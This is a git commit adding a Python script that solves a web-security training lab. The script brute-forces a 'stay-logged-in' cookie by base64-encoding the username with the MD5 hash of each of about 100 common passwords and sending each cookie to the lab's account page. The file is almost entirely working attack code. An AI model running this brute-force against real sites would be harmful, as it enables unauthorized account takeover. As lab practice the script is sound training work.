46c190500cdf56b37515f8bb1c1c7f135a6ab609
skr3zh3t <62206672+skr3zh3t@users.noreply.github.com>
2025-06-01 15:37:51 +0300

    Add files via upload

---
+++ Lab Brute-forcing a stay-logged-in cookie.py
@@ -0,0 +1,122 @@
+import requests
+import hashlib
+import base64
+passwords = [
+    "123456",
+    "password",
+    "12345678",
+    "qwerty",
+    "123456789",
+    "12345",
+    "1234",
+    "111111",
+    "1234567",
+    "dragon",
+    "123123",
+    "baseball",
+    "abc123",
+    "football",
+    "monkey",
+    "letmein",
+    "shadow",
+    "master",
+    "666666",
+    "qwertyuiop",
+    "123321",
+    "mustang",
+    "1234567890",
+    "michael",
+    "654321",
+    "superman",
+    "1qaz2wsx",
+    "7777777",
+    "121212",
+    "000000",
+    "qazwsx",
+    "123qwe",
+    "killer",
+    "trustno1",
+    "jordan",
+    "jennifer",
+    "zxcvbnm",
+    "asdfgh",
+    "hunter",
+    "buster",
+    "soccer",
+    "harley",
+    "batman",
+    "andrew",
+    "tigger",
+    "sunshine",
+    "iloveyou",
+    "2000",
+    "charlie",
+    "robert",
+    "thomas",
+    "hockey",
+    "ranger",
+    "daniel",
+    "starwars",
+    "klaster",
+    "112233",
+    "george",
+    "computer",
+    "michelle",
+    "jessica",
+    "pepper",
+    "1111",
+    "zxcvbn",
+    "555555",
+    "11111111",
+    "131313",
+    "freedom",
+    "777777",
+    "pass",
+    "maggie",
+    "159753",
+    "aaaaaa",
+    "ginger",
+    "princess",
+    "joshua",
+    "cheese",
+    "amanda",
+    "summer",
+    "love",
+    "ashley",
+    "nicole",
+    "chelsea",
+    "biteme",
+    "matthew",
+    "access",
+    "yankees",
+    "987654321",
+    "dallas",
+    "austin",
+    "thunder",
+    "taylor",
+    "matrix",
+    "mobilemail",
+    "mom",
+    "monitor",
+    "monitoring",
+    "montana",
+    "moon",
+    "moscow"
+]
+url = "https://example.web-security-academy.net/my-account?id=carlos"
+a = "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
+headers = {
+    "Cookie": "stay-logged-in="+a+"; session=4guo0eedjmjUpZ1KSe092QTAIJO50GJV"
+}
+for i in range(100):
+    hashed = hashlib.md5(passwords[i].encode('utf-8')).hexdigest()
+    pre_pass = "carlos:"+hashed
+    bytes_data = pre_pass.encode('utf-8')
+    base64_data = base64.b64encode(bytes_data).decode('utf-8')
+    headers = {
+    "Cookie": "stay-logged-in="+base64_data+"; session=4guo0eedjmjUpZ1KSe092QTAIJO50GJV"
+}
+    response = requests.get(url, headers=headers)
+    if "<form class=login-form method=POST action=" not in response.text:
+        print(passwords[i])
+        print(base64_data)
